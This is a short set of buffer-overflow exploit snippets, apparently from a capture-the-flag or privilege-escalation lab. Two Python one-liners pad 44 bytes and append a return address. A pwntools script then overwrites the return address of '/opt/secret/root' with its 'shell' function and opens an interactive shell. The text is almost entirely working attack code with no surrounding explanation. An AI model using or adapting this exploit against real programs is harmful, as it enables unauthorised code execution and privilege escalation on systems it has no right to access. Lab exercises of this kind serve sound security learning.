python -c 'print "A"*44 + "\xcb\x84\x04\x08"'
python -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)'

from pwn import *
proc = process('/opt/secret/root')
elf = ELF('/opt/secret/root')
shell_func = elf.symbols.shell
payload = fit({
44: shell_func # this adds the value of shell_func after 44 characters
})
proc.sendline(payload)
proc.interactive()

